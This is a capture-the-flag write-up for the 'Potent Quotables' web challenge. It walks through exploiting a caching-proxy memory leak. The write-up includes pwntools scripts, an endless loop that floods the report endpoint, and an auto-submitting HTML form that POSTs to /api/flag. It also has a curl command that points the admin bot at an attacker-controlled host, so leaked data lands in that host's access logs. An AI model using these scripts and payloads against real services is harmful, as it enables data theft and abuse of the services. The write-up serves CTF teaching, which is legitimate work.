# Potent Quotables

We found a Heartbleed-like way of solving this and I thought it would be interesting to do a write up on it.

Summary:     
1. [Run script on your server to listen to `quotables.pwni.ng:1337`](#listener)     
1. [Make a payload containing POST to `/api/flag` on another page/server](#post-payload)
1. [Spam reports to admin so he visits your server containing your payload](#spam-reports)

/api/flag only takes POST requests, so we eventually figured that we have to create a page that makes an xhr POST request to it.

First, we analyzed the caching proxy and ran it locally. Using the local version of the [Listener](#local-listener) below, we got a [memory leak](#memory-leak), getting the rest of the proxy's binary:

##### Local Listener
```
#!/usr/bin/env python2

from pwn import *

request = """GET / HTTP/1.1\r
Connection: abcd\r
Content-Length: 1000\r
\r
hello
"""

p = remote("127.0.0.1", 1337)
p.send(request)
p.close()
```

From the second time onwards, you should get a memory leak. This is because the first response is not received but cached.

##### Memory Leak
```
Listening on [0.0.0.0] (family 0, port 5000)
Connection from [127.0.0.1] port 5000 [tcp/*] accepted (family 2, sport 33330)
GET / HTTP/1.1
Connection: close
Content-Length: 1234
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3
Proxy-Connection: close

hello

">
  ">
    "@"Ballnodesf02::2>
                       "ff02::3 ?
                                 "7.0.1.1       pwnbox  px
127.0.1.1       ubuntu-xv"`r"X
                              "X
                                "
                                 "
                                  "A
                                    "A
                                      "wing lines are desirable for IPv6 capable hosts
::1     ip6-localhost   ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

127.0.1.1       pwnbox  pwnbox
127.0.1.1       ubuntu-xenial   ubun
```

Notice that the leak is not in the response, but instead in the request being sent to the server. 

##### Listener
Content-length takes a maximum of 2048 bytes.      
This will force the admin bot to visit your server with the memory leak.

```
from pwn import *
import time

request = """POST /report HTTP/1.1\r
Host: quotables.pwni.ng:1337\r
Content-Length: 100\r
Content-Type: application/x-www-form-urlencoded\r
Connection: close\r
\r
path=http://your-listener.com:1337/?"""

while True:
        p = remote("quotables.pwni.ng", 1337)
        # p = remote("127.0.0.1", 1337)
        p.send(request)
        p.close()
p.interactive()
```

##### Post Payload
```
<iframe name="iframe_id" src=""></iframe>

<form id="formlol" method="POST" action="http://quotables.pwni.ng:1337/api/flag" target="iframe_id">
<input type="submit" value="go">
</form>

<script>
    setInterval(function(){
        document.getElementById("formlol").submit();
    }, 50)
</script>

```

##### Spam reports
```
curl -i -s -k  -X $'POST' \
    -H $'Host: quotables.pwni.ng:1337' -H $'User-Agent: Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://quotables.pwni.ng:1337/quote' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 34' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'path=https://your-server.com/ddos.html' \
    $'http://quotables.pwni.ng:1337/report'
```

Then all that's left to do is to constantly check your access logs with `|grep host:port`.     
You'll be getting requests from paths like `GET /?m-data;%20name=%22vote%22%0D%0A%0D%0A%201%0D%0A` and just have to wait until it gives the flag.

*Courtesy of Team OTA / OpenBlue*

##### Reference:     
- https://docs.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.7.2
